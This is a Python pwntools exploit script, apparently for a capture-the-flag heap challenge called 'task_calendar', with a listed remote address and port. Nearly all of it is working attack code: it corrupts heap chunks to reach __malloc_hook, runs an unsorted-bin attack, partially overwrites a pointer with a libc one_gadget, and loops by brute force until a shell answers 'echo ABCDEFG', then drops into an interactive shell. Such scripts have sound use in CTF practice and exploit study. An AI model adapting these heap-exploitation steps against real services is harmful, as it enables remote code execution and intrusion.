#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./task_calendar"
libcPath = "./libc.so.6"
remoteAddr = "117.78.26.133"
remotePort = 31666

context.binary = elfPath
elf = context.binary
#  if sys.argv[1] == "l":
    #  io = process(elfPath, timeout = 5)
    #  libc = elf.libc

#  else:
    #  if sys.argv[1] == "d":
        #  io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    #  else:
        #  io = remote(remoteAddr, remotePort, timeout = 5)
    #  if libcPath:
        #  libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    info("edit -> {:#x}".format(0xEC8 + base))
    info("free -> {:#x}".format(0xF0B + base))
    info("malloc -> {:#x}".format(0xDC6 + base))
    raw_input("DEBUG: ")

def add(idx, size):
    assert 1 <= idx <= 4
    assert 0 <= size <= 0x68
    io.sendlineafter("choice> ", "1")
    io.sendlineafter("choice> ", str(idx))
    io.sendlineafter("size> ", str(size))

def edit(idx, size, info):
    assert 1 <= idx <= 4
    io.sendlineafter("choice> ", "2")
    io.sendlineafter("choice> ", str(idx))
    io.sendlineafter("size> ", str(size))
    io.sendafter("info> ", info)
    sleep(0.01)

def delete(idx):
    assert 1 <= idx <= 4
    io.sendlineafter("choice> ", "3")
    io.sendlineafter("choice> ", str(idx))

if __name__ == "__main__":
    while True:
        io = process(elfPath, timeout = 5)
        libc = elf.libc
        #  io = remote(remoteAddr, remotePort, timeout = 5)
        io.sendlineafter("name> ", "m4x")
        add(1, 0x68)
        add(2, 0x68)
        add(3, 0x68)
        # forge unsorted bin
        edit(3, 0x60, flat(0, 0, 0x90, 0x51) + '\n')
        edit(1, 0x68, '0' * 0x68 + '\x91')
        delete(2) # chunk2 -> main_arena + 88
    
        edit(1, 0x68, '1' * 0x68 + '\x71')
        delete(1) # chunk1
        delete(3) # chunk3 -> chunk1
        edit(3, 1, '\x70\x70') # chunk3 -> chunk2 -> main_arena + 88
        edit(2, 1, '\xfd\x1a') # chunk3 -> chunk2 -> __malloc_hook - 0x13 -> 0x7f
    
        add(1, 0x68) # chunk2 -> __malloc_hook - 0x13 -> 0x7f
        add(4, 0x68) # __malloc_hook - 0x13 -> 0x7f
        add(3, 0x68) # 0x7f
        delete(4) # chunk4 -> 0x7f
        edit(4, 7, p64(0)) # chunk4
    
        # unsorted bin attack
        add(1, 0x68)
        edit(1, 9, flat(0, '\0', '\x1b'))
        add(1, 0x68)
    
        # partial overwrite
        #  DEBUG() 
        libc.sym['one_gadget'] = 0xf02a4
        libc.address = 0x7ffff7a0d000
        info("one_gadget -> {:#x}".format(libc.sym['one_gadget']))
        edit(3, 5, '\0\0\0' + p64(libc.sym['one_gadget'])[: 3])
    
        # trigger one_gadget
        delete(4)
        delete(4)
        
        try:
            io.sendlineafter("echo ABCDEFG")
            io.recvuntil("ABCDEFG")
            io.sendline("ls")
            io.interactive()
        except:
            io.close()
